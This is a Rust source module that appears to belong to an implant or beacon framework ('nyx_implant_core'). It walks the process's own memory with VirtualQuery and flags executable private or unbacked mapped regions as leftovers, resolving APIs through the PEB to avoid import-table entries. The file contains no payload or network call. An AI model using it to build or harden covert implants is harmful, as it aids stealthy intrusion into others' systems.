//! Current-process VAD walk (R1). Session-0 safe: VirtualQuery only.
//!
//! Flags committed executable regions as Image / Mapped / Private, records
//! protect bits, and resolves a backing name via the PEB loader list (and
//! `K32GetMappedFileNameW` when that export resolves). Disk-hash of Image
//! `.text` is skipped (too heavy for the selftest). Private+X and
//! Mapped+X-unbacked are the minimum findings.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use nyx_implant_core::resolve::{export_addr, peb_pointer, ListEntry};

/// `MEM_COMMIT`.
pub const MEM_COMMIT: u32 = 0x1000;
/// `MEM_IMAGE`.
pub const MEM_IMAGE: u32 = 0x1000000;
/// `MEM_MAPPED`.
pub const MEM_MAPPED: u32 = 0x40000;
/// `MEM_PRIVATE`.
pub const MEM_PRIVATE: u32 = 0x20000;

const PAGE_EXECUTE: u32 = 0x10;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;

/// x64 user-mode ceiling (48-bit canonical).
const USER_CEILING: usize = 0x0000_7FFF_FFFE_FFFF;
const MAX_REGIONS: u32 = 1_000_000;

/// `MEMORY_BASIC_INFORMATION` (x64, Win10 1607+ PartitionId). VirtualQuery
/// on modern Windows writes 48–56 bytes; Type lives at offset 40 either way.
const MBI_LEN: usize = 56;

type VirtualQueryFn = unsafe extern "system" fn(*const c_void, *mut u8, usize) -> usize;

/// One committed region from the VirtualQuery walk.
#[derive(Clone, Copy)]
pub struct VadRegion {
    pub base: usize,
    pub size: usize,
    pub state: u32,
    pub protect: u32,
    pub ty: u32,
    pub executable: bool,
    pub has_name: bool,
}

/// Compact walk summary consumed by `nyx_selftest_vad`.
#[derive(Clone, Copy, Default)]
pub struct VadReport {
    pub walked: u32,
    pub image_rx: u32,
    pub private_exec: u32,
    pub mapped_exec_unbacked: u32,
}

/// Finding bits on [`VadReport`] (independent of the selftest exit mask).
pub const FINDING_PRIVATE_EXEC: u32 = 1 << 0;
pub const FINDING_MAPPED_EXEC_UNBACKED: u32 = 1 << 1;

impl VadReport {
    /// Bitmask of unexpected executable leftovers (Private+X, Mapped+X-unbacked).
    pub fn findings(&self) -> u32 {
        let mut f = 0u32;
        if self.private_exec > 0 {
            f |= FINDING_PRIVATE_EXEC;
        }
        if self.mapped_exec_unbacked > 0 {
            f |= FINDING_MAPPED_EXEC_UNBACKED;
        }
        f
    }
}

/// True if `protect` has an EXECUTE bit (ignores PAGE_GUARD / cache flags).
pub fn protect_executable(protect: u32) -> bool {
    let p = protect & 0xFF;
    (p & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) != 0
}

/// True if `protect` is Image-typical RX (including execute-writecopy).
fn protect_image_rx(protect: u32) -> bool {
    let p = protect & 0xFF;
    p == PAGE_EXECUTE_READ || p == PAGE_EXECUTE_WRITECOPY
}

/// Walk every user-mode VAD in the current process.
///
/// # Safety
/// PEB + VirtualQuery on a live Windows thread. Single-threaded beacon context.
pub unsafe fn scan() -> Option<VadReport> {
    let vq = virtual_query()?;
    let mut report = VadReport::default();
    let mut addr: usize = 0;
    while addr < USER_CEILING && report.walked < MAX_REGIONS {
        let Some(mbi) = query_at(vq, addr) else {
            break;
        };
        let base = mbi.base;
        let size = mbi.size;
        if size == 0 {
            addr = addr.saturating_add(0x1000);
            continue;
        }
        report.walked = report.walked.saturating_add(1);
        if mbi.state == MEM_COMMIT && mbi.executable {
            classify_committed_exec(&mbi, &mut report);
        }
        match base.checked_add(size) {
            Some(next) if next > addr => addr = next,
            _ => break,
        }
    }
    Some(report)
}

/// Query a single address. Used by the selftest scratch leftover check.
///
/// # Safety
/// Same as [`scan`].
pub unsafe fn query_one(addr: usize) -> Option<VadRegion> {
    let vq = virtual_query()?;
    query_at(vq, addr)
}

fn classify_committed_exec(mbi: &VadRegion, report: &mut VadReport) {
    if mbi.ty == MEM_IMAGE && protect_image_rx(mbi.protect) {
        report.image_rx = report.image_rx.saturating_add(1);
    }
    if mbi.ty == MEM_PRIVATE {
        report.private_exec = report.private_exec.saturating_add(1);
    }
    if mbi.ty == MEM_MAPPED && !mbi.has_name {
        report.mapped_exec_unbacked = report.mapped_exec_unbacked.saturating_add(1);
    }
}

unsafe fn virtual_query() -> Option<VirtualQueryFn> {
    let a = export_addr(b"kernel32.dll", b"VirtualQuery")?;
    Some(core::mem::transmute(a))
}

unsafe fn query_at(vq: VirtualQueryFn, addr: usize) -> Option<VadRegion> {
    let mut mbi = [0u8; MBI_LEN];
    let got = vq(addr as *const c_void, mbi.as_mut_ptr(), mbi.len());
    if got < 48 {
        return None;
    }
    let base = read_usize(&mbi, 0);
    let size = read_usize(&mbi, 24);
    let state = read_u32(&mbi, 32);
    let protect = read_u32(&mbi, 36);
    let ty = read_u32(&mbi, 40);
    let executable = protect_executable(protect);
    let has_name = if executable {
        region_has_name(base)
    } else {
        false
    };
    Some(VadRegion {
        base,
        size,
        state,
        protect,
        ty,
        executable,
        has_name,
    })
}

fn read_usize(buf: &[u8], off: usize) -> usize {
    let mut b = [0u8; 8];
    b.copy_from_slice(&buf[off..off + 8]);
    usize::from_le_bytes(b)
}

fn read_u32(buf: &[u8], off: usize) -> u32 {
    let mut b = [0u8; 4];
    b.copy_from_slice(&buf[off..off + 4]);
    u32::from_le_bytes(b)
}

/// PEB InLoadOrderModuleList first; `K32GetMappedFileNameW` if the export
/// resolves (no import-table dependency).
unsafe fn region_has_name(base: usize) -> bool {
    if peb_module_covers(base) {
        return true;
    }
    mapped_file_name_len(base) > 0
}

unsafe fn peb_module_covers(addr: usize) -> bool {
    let peb = match peb_pointer() {
        Some(p) => p,
        None => return false,
    };
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return false;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    let mut guard = 0u32;
    while head as *const u8 != list_start && guard < 256 {
        guard += 1;
        let entry: *mut ListEntry = head;
        let dll_base = (*entry).dll_base as usize;
        let img = (*entry).size_of_image as usize;
        if dll_base != 0 && addr >= dll_base && addr < dll_base.saturating_add(img) {
            let nb = (*entry).base_dll_name.buffer;
            let nl = (*entry).base_dll_name.length as usize / 2;
            return !nb.is_null() && nl > 0;
        }
        head = (*entry).in_load_order_links.flink;
    }
    false
}

unsafe fn mapped_file_name_len(addr: usize) -> u32 {
    type GetMapped = unsafe extern "system" fn(*mut c_void, *mut c_void, *mut u16, u32) -> u32;
    let a = match export_addr(b"kernel32.dll", b"K32GetMappedFileNameW") {
        Some(x) => x,
        None => return 0,
    };
    let f: GetMapped = core::mem::transmute(a);
    let mut name = [0u16; 260];
    // GetCurrentProcess pseudo-handle = (HANDLE)-1.
    f(
        -1isize as *mut c_void,
        addr as *mut c_void,
        name.as_mut_ptr(),
        name.len() as u32,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn execute_bits_match_winnt() {
        assert!(protect_executable(PAGE_EXECUTE_READ));
        assert!(protect_executable(PAGE_EXECUTE_READWRITE));
        assert!(protect_executable(PAGE_EXECUTE));
        assert!(!protect_executable(0x04)); // PAGE_READWRITE
        assert!(!protect_executable(0x01)); // PAGE_NOACCESS
        assert!(protect_image_rx(PAGE_EXECUTE_READ));
        assert!(!protect_image_rx(PAGE_EXECUTE_READWRITE));
    }
}
